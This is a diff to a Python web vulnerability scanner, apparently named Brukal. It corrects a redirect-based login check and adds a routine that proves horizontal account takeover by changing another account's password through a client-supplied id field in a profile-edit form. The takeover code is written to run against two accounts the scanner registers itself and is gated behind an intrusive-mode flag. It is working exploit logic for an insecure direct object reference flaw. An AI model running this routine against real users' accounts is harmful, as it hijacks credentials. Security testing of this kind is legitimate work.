@@ -209,7 +209,8 @@ _COVERAGE_WORDS = {
     "Cross-site scripting": ("cross-site scripting", "xss"),
     "SSRF": ("server-side request",),
     "Open redirect": ("open redirect",),
-    "Object-level authz (BOLA)": ("object-level authorization", "idor"),
+    "Object-level authz (BOLA)": ("object-level authorization", "idor",
+                                  "horizontal account takeover"),
     # A new detector whose title matches no word here produces a report that
     # CONTRADICTS ITSELF: the finding list carries a CRITICAL while the coverage table
     # says the class found nothing. That has now happened three times — model-proposed
@@ -1515,7 +1516,15 @@ class AssistSession:
             failed = bool(self._AUTH_ERROR_RE.search((res2.body or "")[:2000])
                           or re.search(r'"status"\s*:\s*"(?:fail|error)"',
                                        (res2.body or "")[:2000], re.I))
-            ok = bool((redirected_away or no_login_form) and not failed)
+            # A REDIRECT is decided by its destination, not by the shape of its body.
+            # A 302 carries little or no body, so `no_login_form` — "the answer no
+            # longer shows a password field" — is vacuously true for it, and a failed
+            # login bounced straight back to /login was read as AUTHENTICATED. The body
+            # heuristic is only meaningful when the server actually returned a page.
+            if res2.status in (301, 302, 303, 307, 308):
+                ok = bool(redirected_away and not failed)
+            else:
+                ok = bool(no_login_form and not failed)
         self.authenticated = ok
         if ok and not self.identity:
             # Who we are is set in the token branch above and was set NOWHERE else, so a
@@ -3713,6 +3722,147 @@ class AssistSession:
         self.note(f"[confirm] self-registered account reaches {url}")
         return True
 
+    _ID_FIELD_RE = re.compile(r"^(?:id|user_?id|uid|account_?id|profile_?id)$", re.I)
+
+    def profile_edit_targets(self, limit: int = 3):
+        """Forms that write a credential to a record the CLIENT names.
+
+        The dangerous shape is a profile editor whose victim is chosen by a body field:
+        `POST /app/useredit` with `id`, `password`, `cpassword`. Every authorization
+        prover Brukal had looked for the identifier in the PATH — `/users/{name}` — so a
+        form that carries it in the body was invisible to all of them, and it is the more
+        common arrangement on a server-rendered application. Returns
+        (action, fields, id_field, pass_field, confirm_field)."""
+        surface = getattr(self, "surface", None)
+        out = []
+        for form in (getattr(surface, "forms", []) or []):
+            if (getattr(form, "method", "") or "").upper() != "POST":
+                continue
+            fields = list(getattr(form, "inputs", []) or [])
+            names = [n for n, _t in fields]
+            id_field = next((n for n in names if self._ID_FIELD_RE.search(n)), "")
+            pass_field = confirm_field = ""
+            for n, t in fields:
+                role = ""
+                for rname, rx in self._FIELD_ROLES:
+                    if rx.search(n):
+                        role = rname
+                        break
+                if not role and (t or "").lower() == "password":
+                    role = "password"
+                if role == "password" and not pass_field:
+                    pass_field = n
+                elif role == "confirm" and not confirm_field:
+                    confirm_field = n
+            if id_field and pass_field:
+                out.append((form.action, fields, id_field, pass_field, confirm_field))
+                if len(out) >= limit:
+                    break
+        return out
+
+    def confirm_horizontal_takeover_via_form(self, edit_url, fields, id_field,
+                                             pass_field, confirm_field="") -> bool:
+        """Horizontal account takeover through a form that names its victim in the BODY.
+
+        The write Brukal could not see. `confirm_bfla_password_takeover` proves this
+        already, but only where the victim sits in a templated path and a bearer token
+        carries the session — so on a server-rendered app it never even looked. DVNA's
+        handler is `db.User.find({where:{'id': req.body.id}})` followed by a password
+        write, with no ownership check anywhere.
+
+        Both principals are accounts BRUKAL CREATES, seconds apart, through the public
+        signup form. That matters twice over: no real user's credential is touched, and
+        the victim's row id is READ from its own edit page rather than guessed, so the
+        proof never depends on a lucky number.
+
+        The proof is a login, not a status code — a 200 says the server accepted the
+        request, not that the credential moved. Control first: the password we are about
+        to set must not ALREADY authenticate the victim, or the 'proof' is a
+        coincidence. Writes, so allow_intrusive gates it, and it is irreversible by
+        nature: the victim's original password is not knowable. That is exactly why it
+        is gated."""
+        from urllib.parse import urlencode
+
+        from .findings import Finding
+        from .web import WebAction
+        if self.browser is None or not self.allow_intrusive or not edit_url:
+            return False
+        new_password = "Brukal-Takeover-Pr00f!"
+
+        def submit(body: dict):
+            return self.browser.run(WebAction(
+                "request", url=edit_url, method="POST", body=urlencode(body),
+                headers={"Content-Type": "application/x-www-form-urlencoded"}))[1]
+
+        with self._separate_identity():
+            victim = self._register_account()
+            if not victim:
+                return False
+            vuser, vpass = victim
+            # The victim's own edit page renders its row id into the form. Reading it is
+            # what makes this deterministic rather than a guess at a sequence.
+            try:
+                _d, page = self.browser.run(WebAction("request", url=edit_url,
+                                                      method="GET"))
+            except Exception:
+                return False
+            vid = ""
+            for tag in re.finditer(r"<input\b[^>]*>", (getattr(page, "body", "") or ""),
+                                   re.I):
+                t = tag.group(0)
+                nm = re.search(r'name=["\']([^"\']+)["\']', t, re.I)
+                vl = re.search(r'value=["\']([^"\']*)["\']', t, re.I)
+                if nm and vl and nm.group(1) == id_field and vl.group(1).strip():
+                    vid = vl.group(1).strip()
+                    break
+            if not vid:
+                return False
+
+        # Control: the password we intend to set must not already work for the victim.
+        with self._separate_identity():
+            login_url = self._login_endpoint()
+            if not login_url or self.login(login_url, vuser, new_password):
+                return False
+
+        with self._separate_identity():
+            attacker = self._register_account()
+            if not attacker:
+                return False
+            auser, _apass = attacker
+            body = {}
+            for n, t in fields:
+                if (t or "").lower() in ("submit", "file"):
+                    continue
+                body[n] = "brukal"
+            body[id_field] = vid
+            body[pass_field] = new_password
+            if confirm_field:
+                body[confirm_field] = new_password
+            try:
+                submit(body)
+            except Exception:
+                return False
+
+        # Proof: a session issued FOR THE VICTIM, using a password the attacker chose.
+        with self._separate_identity():
+            if not self.login(self._login_endpoint() or "", vuser, new_password):
+                return False
+
+        self.findings.add(Finding(
+            title="Horizontal account takeover via client-supplied record id",
+            severity="critical", category="api",
+            target=edit_url, param=id_field, confirmed=True,
+            evidence=(f"account {auser!r} set the password of account {vuser!r} "
+                      f"(row {id_field}={vid}) by naming it in the request body, and "
+                      f"the victim's credentials then authenticated with the value the "
+                      f"attacker chose — the same password did NOT authenticate before "
+                      f"the write, so the change is what moved it"),
+            source=(f"register two accounts via the public signup form; as {auser}, "
+                    f"POST {edit_url} with {id_field}={vid} and a chosen "
+                    f"{pass_field}; then log in as {vuser} with it")))
+        self.note(f"[confirm] horizontal account takeover via {edit_url} ({id_field})")
+        return True
+
     _PRIVILEGED_RE = re.compile(
         r"/(?:admin|administrator|manage(?:ment)?|console|staff|internal|backoffice|"
         r"back-office|superuser|sysadmin|moderat|owner)(?:/|$|\?)", re.I)
@@ -4162,6 +4312,23 @@ class AssistSession:
                         break          # one proof of this class is enough
                 except Exception:
                     pass
+
+            # The write, not just the read: a form that names its victim in the body.
+            # Gated behind allow_intrusive because it moves somebody's credential — both
+            # accounts are ones Brukal creates, so nobody real is affected.
+            if self.allow_intrusive:
+                for _eurl, _f, _idf, _pf, _cf in self.profile_edit_targets():
+                    if self._confirm_budget <= 0 or self._rate_limited:
+                        break
+                    self._covered("Object-level authz (BOLA)",
+                                  note="two self-registered accounts; proof is a login")
+                    try:
+                        if self.confirm_horizontal_takeover_via_form(
+                                _eurl, _f, _idf, _pf, _cf):
+                            confirmed += 1
+                            break
+                    except Exception:
+                        pass
 
             for _rurl, _idp, _tokp in self.reset_token_targets():
                 if self._confirm_budget <= 0 or self._rate_limited:
